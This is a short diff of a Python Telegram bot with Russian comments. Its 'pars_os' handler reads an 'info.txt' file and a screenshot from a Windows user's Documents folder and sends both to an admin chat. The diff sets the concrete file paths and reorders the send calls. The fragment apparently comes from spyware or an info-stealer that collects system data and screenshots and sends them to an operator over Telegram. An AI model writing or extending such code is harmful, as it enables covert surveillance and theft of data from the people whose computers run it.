@@ -41,11 +41,11 @@ for adminF in ADMINS:
 text = "Screenshot" # Требуется при создании скриншота (текст к фото)
 @dp.message_handler(commands="pars_os") # Выполняет действия при команде start
 async def pars_os(dp: Dispatcher):
-    upfile = open("Путь до файла\info.txt", "rb") # Читает файлы
-    uphoto = open("Путь до файла\screenshot.jpg", "rb")
+    upfile = open("C:\\Users\\{name}\\Documents\\info.txt", "rb") # Читает файлы
+    uphoto = open("C:\\Users\\{name}\\Documents\\screenshot.jpg", "rb")
     
-    await dp.bot.send_photo(admin, uphoto, text) # Отправляет данные
-    await dp.bot.send_document(admin, upfile)
+    await dp.bot.send_document(admin, upfile) # Отправляет данные
+    await dp.bot.send_photo(admin, uphoto, text)
     
     upfile.close() # Закрывает файлы (обязательно)
     uphoto.close()
